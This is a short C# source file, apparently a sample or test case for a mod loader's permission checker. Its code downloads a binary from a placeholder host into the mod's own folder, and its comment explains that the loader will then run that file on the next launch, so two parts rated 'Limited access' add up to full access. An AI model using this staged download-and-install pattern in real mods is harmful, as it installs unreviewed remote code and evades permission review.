// SPDX-License-Identifier: MIT
// Downloads a file and writes it next to its own DLL. The loader loads any DLL in a mod's folder
// that something references, so this can install code for the next launch without loading any
// itself. Each part alone is Limited access; together they are Full access.
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

public class Downloader {
    static string ModFolder => Path.GetDirectoryName(typeof(Downloader).Assembly.Location);

    public static async Task Update() {
        var bytes = await new HttpClient().GetByteArrayAsync("https://example.invalid/update.bin");
        File.WriteAllBytes(Path.Combine(ModFolder, "update.bin"), bytes);
    }
}
